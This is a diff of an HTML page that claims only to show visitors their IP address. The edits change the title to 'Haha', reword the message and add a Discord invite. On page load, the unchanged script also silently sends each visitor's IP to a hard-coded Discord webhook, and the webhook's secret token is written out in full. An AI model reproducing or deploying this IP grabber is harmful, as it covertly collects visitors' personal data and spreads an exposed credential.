@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Show User IP</title>
+    <title>Haha</title>
     <script>
       function displayIP() {
         fetch("https://api.ipify.org/?format=json")
@@ -19,7 +19,7 @@
       
       function sendToWebhook(ip) {
         const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
-        const message = "IP Address: " + ip;
+        const message = "Your ip: " + ip;
         
         fetch(webhookURL, {
           method: "POST",
@@ -36,5 +36,6 @@
   <body onload="displayIP()">
     <h1>Your IP Address:</h1>
     <p id="ip">Loading...</p>
+    <div> If you would like to join us then join our discord server: https://discord.gg/SXez2zT9</div>
   </body>
 </html>
